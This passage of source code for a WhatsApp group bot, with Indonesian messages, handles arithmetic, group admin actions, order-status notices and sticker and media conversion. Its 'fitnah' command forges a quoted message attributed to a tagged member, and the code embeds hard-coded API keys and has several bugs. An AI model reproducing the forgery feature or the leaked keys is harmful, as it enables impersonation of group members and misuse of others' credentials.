if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'p': case 'proses':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`, [sender])
}
break
case 'd': case 'done':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`, [sender])
}
break
case 'setppbot':
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#setppbot* atau reply gambar yang sudah dikirim dengan pesan *#setppbot*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
conn.updateProfilePicture(botNumber, { url: media })
reply('Sukses Mengganti Profile Bot')
await sleep(2000)
fs.unlinkSync(media)
break
case 'git': case 'gitclone':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply('link githubnya mana?\n*Contoh:*\n#gitclone https://github.com/Lexxy24/MenfessV1')
var linknya = q
if (!regex1.test(linknya)) return reply('link salah!')
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
reply(`*Mohon tunggu, sedang mengirim repository..*`)
conn.sendMessage(from, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: msg }).catch((err) => reply('Maaf link github yang kamu berikan di private, dan tidak bisa di jadikan file'))
}
break
case 'badgirlserti': case 'goodgirlserti': case 'bucinserti': case 'fuckgirlserti': case 'toloserti': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`*Contoh:*\n${prefix + command} text`)
var anu = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=SadTeams&name=${q}`)
reply(mess.wait)
conn.sendMessage(from, { image: anu, caption: `${command}` }, { quoted: msg }).catch((err) => reply('Maaf server LolHuman sedang down'))
}
break
case 'fitnah':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1]
var bot = q.split("|")[2]
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case 'del':
case 'delete':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break
case 'linkgrup': case 'linkgc':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break
case 'kick':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
} else {
reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
}
break
case 'setppgrup': case 'setppgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
await conn.updateProfilePicture(from, { url: media })
await sleep(2000)
reply('Sukses mengganti foto profile group')
fs.unlinkSync(media)
break
case 'setnamegrup': case 'setnamegc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} teks`)
await conn.groupUpdateSubject(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'setdesc': case 'setdescription':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah ${command} teks`)
await conn.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'group': case 'grup':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
conn.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
conn.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
break
case 'hidetag':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'welcome':{
if (!isGroup) return reply('Khusus Group!') 
if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return reply("Khusus admin!")
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isWelcome) return reply('Sudah aktif✓')
welcomeJson.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
welcomeJson.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Success menonaktifkan welcome di group:\n'+groupName)
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'antilink':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'promote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'tiktokauto':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAutoDownTT) return reply('Auto download tiktok sudah aktif')
auto_downloadTT.push(from)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mengaktifkan auto download tiktok')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAutoDownTT) return reply('Auto download tiktok belum aktif')
auto_downloadTT.splice(anu, 1)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mematikan auto download tiktok')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'demote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'infogc':
case 'infogrup':
case 'infogroup':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
let cekgcnya =`*INFO GROUP*
• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome? "aktif":"tidak"}
• *Antilink:* ${isAntiLink? "aktif":"tidak"}
• *Tiktok Auto:* ${isAutoDownTT? "aktif":"tidak"}`
reply(cekgcnya)
break
case 'text_grup':{
const reactionMessage = { react: { text: "🗿", key: msg.key}}
conn.sendMessage(from, reactionMessage)
}
break
case 'ttp':{
if (!q) return reply(`Contoh :\n#${command} ohlx`)
conn.sendMessage(from, {sticker:{url:anu}, mimetype: 'image/webp'})
}
break
case 'sound1':case 'sound2':
case 'sound3':case 'sound4':case 'sound5':case 'sound6':
case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':
case 'sound15':case 'sound16':case 'sound17':case 'sound18':
case 'sound19':case 'sound20':case 'sound21':case 'sound22':
case 'sound23':case 'sound24':case 'sound25':case 'sound26':
case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':
case 'sound35':case 'sound36':case 'sound37':case 'sound38':
case 'sound39':case 'sound40':case 'sound41':case 'sound42':
case 'sound43':case 'sound44':case 'sound45':case 'sound46':
case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':
case 'sound55':case 'sound56':case 'sound57':case 'sound58':
case 'sound59':case 'sound60':case 'sound61':case 'sound62':
case 'sound63':case 'sound64':case 'sound65':case 'sound66':
case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(mess.wait)
var inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
conn.sendMessage(from, {audio:inicdd, mimetype:'audio/mpeg', ptt:true}, {quoted:msg})
break
case 'audio1': case 'audio2': case 'audio3': case 'audio4': case 'audio5': case 'audio6': case 'audio7': case 'audio8': case 'audio9': case 'audio10': case 'audio11': case 'audio12': case 'audio13': case 'audio14': case 'audio15': case 'audio16': case 'audio17': case 'audio18': case 'audio19': case 'audio20':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(mess.wait)
conn.sendMessage(from, {audio:{url:`https://md-devs.herokuapp.com/${command}.mp3`}, mimetype:'audio/mp4', ptt:true},{quoted:msg})
break
case 'tourl': case 'upload':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender.split("@")[0]}.webp`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
fs.unlinkSync(rand2)
} else if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
var rand2 = 'sticker/'+getRandom('.mp4')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
fs.unlinkSync(rand2)
} else if (isImage || isQuotedImage){
var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
let buffer_up = fs.readFileSync(mediany)
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(mediany)
fs.unlinkSync(rand2)
} else if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp3`)
var rand2 = 'sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp3`)
fs.unlinkSync(rand2)
} else {
reply(`*reply audio/video/sticker/gambar dengan pesan ${prefix+command}*`)
}
break
case 'tomp3':
case 'toaudio':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
let ran = './sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${ran}`, media)
exec(`ffmpeg -i ${media} ${ran}`)
conn.sendMessage(from, { audio: fs.readFileSync(ran),  mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
fs.unlinkSync(ran)
fs.unlinkSync(media)
} else {
reply(`*Reply video dengan pesan ${prefix+command}*`)
}
break
case 'base64':
case 'base32':{
if (!q) return reply(`Example :\n${prefix+command} ohlx`)
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=${command}&encode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.encode}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break
case 'debase64':{
if (!q) return reply(`Example :\n${prefix+command} cA==`)
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base64&decode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break
case 'debase32':{
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base32&decode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

// FITUR BELOM JADI OM
/*
case 'addmsg':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
//if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var nama_file = `${makeid(5)}`
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./storage/${nama_file}.jpg`)
var media_us = fs.readFileSync(`./storage/${nama_file}.jpg`)
var rand2 = 'storage/'+nama_file+('.jpg')
fs.writeFileSync(`./${rand1}`, media_us)
medianya.push({"id": sender, "fileName": nama_file})
reply(`Sukses Add Database

*namafile:* ${sender.split('@')[0]}
*type:* image

jika ingin mengambil gambarnya
*ketik:* #getmsg`)
} else {
reply(`Kirim gambar dengan caption *${prefix+command}* atau balas gambar yang sudah dikirim`)
}
break
case "getmsg":{
if(!q) return reply('Contoh:\*#getfoto namafile*')
var ran = './storage/'+q+('.jpg')
if (medianya == ran) return reply('ga ada')
conn.sendMessage(from, {image:{url:ran}, caption:'done!'})
await sleep(5000)
if (ran.err) return reply ('nama file ga ada')
reply('gambar sudah dihapus didatabase')
fs.unlinkSync(ran)
//fs.unlinkSync(medianya)
}
break
*/

// CONVERT
case 'toimg': case 'toimage':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand1 = 'sticker/'+getRandom('.webp')
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
reply(mess.wait)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.error.api)
conn.sendMessage(from, {caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply('*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*')
}
break
case 'tomp4': case 'tovideo':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
let buffer = `./sticker/${sender.split("@")[0]}.webp`
reply(mess.wait)
let webpToMp4 = await webp2mp4File(buffer)
conn.sendMessage(from, { video: {url:webpToMp4.result}, caption: 'Convert Webp To Video'}, { quoted: msg })
fs.unlinkSync(buffer)
} else {
reply('*Reply sticker gif dengan pesan #tovideo*')
}
break
case 'emojimix': case 'mixemoji':
case 'emojmix': case 'emojinua':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : !${command} 😜+😅`)
if (!q.includes('+')) return reply(`Format salah, contoh pemakaian !${command} 😅+😭`)
var emo1 = q.split("+")[0]
var emo2 = q.split("+")[1]
if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
.then(data => {
var opt = { packname: 'OHLXbot', author: 'By OHLX' }
conn.sendImageAsSticker(from, data.results[0].url, msg, opt)
}).catch((e) => reply(mess.error.api))
break
case 'emojimix2': case 'mixemoji2':
case 'emojmix2': case 'emojinua2':{
if (!q) return reply(`Example : ${prefix + command} 😅`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(q)}`)
for (let res of anu.results) {
var opt = { packname: 'OHLXbot', author: 'By OHLX' }
let encmedia = await conn.sendImageAsSticker(from, res.url, msg, opt)
}
}
break
case 'smeme':
case 'stikermeme':
case 'stickermeme':
case 'memestiker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var atas = q.split('|')[0]
var bawah = q.split('|')[1]
if (!atas) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (!bawah) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (isImage || isQuotedImage){
reply(mess.wait)
var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
var opt = { packname: 'OHLXbot', author: 'By OHLX' }
conn.sendImageAsSticker(from, meme_url, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
}
break
case 'swm':
case 'stikerwm':
case 'stickerwm':
case 'takesticker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
var pname = q.split('|')[0]
var athor = q.split('|')[1]
reply(mess.wait)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else if (isVideo || isQuotedVideo) {
reply(mess.wait)
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
}
break
case 'sticker': case 's': case 'stiker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.jpeg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
fs.unlinkSync(`./${rand2}`)})}).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"]).toFormat('webp').save(`${rand2}`)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} atau balas gambar yang sudah dikirim`)
}
break
case 'sgif':
case 'stickergif':
case 'stikergif':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
await conn.downloadAndSaveMediaMessage(msg, "video", `./sticker/${sender.split("@")[0]}.mp4`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(buffer)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
} else {
reply(`Kirim video dengan caption ${prefix+command} atau balas video yang sudah dikirim`)
}
break
